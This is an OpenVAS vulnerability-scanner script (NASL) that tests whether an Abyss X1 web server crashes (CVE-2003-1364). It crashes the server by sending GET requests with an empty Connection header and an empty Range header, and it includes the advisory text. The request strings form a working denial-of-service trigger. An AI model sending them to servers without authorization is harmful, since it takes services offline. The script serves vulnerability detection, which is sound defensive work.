# OpenVAS Vulnerability Test
# $Id: abyss_dos.nasl 16 2013-10-27 13:09:52Z jan $
# Description: Abyss httpd crash
#
# Authors:
# Renaud Deraison <deraison@cvs.nessus.org>
#
# Copyright:
# Copyright (C) 2003 Renaud Deraison
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to kill the web server by
sending empty HTTP fields (namely Connection: and Range: ).

An attacker may use this flaw to prevent this host from performing
its job properly.";

tag_solution = "If the remote web server is Abyss X1, then upgrade to
Abyss X1 v.1.1.4, otherwise inform your vendor of this flaw.";

# References:
# Date: Sat, 5 Apr 2003 12:21:48 +0000
# From: Auriemma Luigi <aluigi@pivx.com>
# To: bugtraq@securityfocus.com, vulnwatch@vulnwatch.org,
#        full-disclosure@lists.netsys.com, list@dshield.org
# Subject: [VulnWatch] Abyss X1 1.1.2 remote crash

if(description)
{
 script_id(80047);;
 script_version("$Revision: 16 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
 script_cve_id("CVE-2003-1364");
 script_bugtraq_id(7287);
 script_xref(name:"OSVDB", value:"2226");
 script_tag(name:"cvss_base", value:"8.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:C");
 script_tag(name:"risk_factor", value:"Critical");
 name = "Abyss httpd crash";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 
 summary = "Empty HTTP fields crash the remote web server";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2003 Renaud Deraison");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service1.nasl", "no404.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

########


include("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
banner = get_http_banner(port:port);
if ( ! banner || "Abyss/" >!< banner ) exit(0);

if(http_is_dead(port:port))exit(0);

req = string("GET / HTTP/1.0\r\n", "Host: ", get_host_name(), "\r\n", "Connection: \r\n\r\n");
soc = http_open_socket(port);
if(! soc) exit(0);

send(socket:soc, data: req);
r = http_recv(socket:soc);
http_close_socket(soc);



if(http_is_dead(port: port)) { security_hole(port); }



req = string("GET / HTTP/1.0\r\n", "Host: ", get_host_name(), "\r\n", "Range: \r\n\r\n");
soc = http_open_socket(port);
if(! soc) exit(0);

send(socket:soc, data: req);
r = http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port: port)) { security_hole(port); }
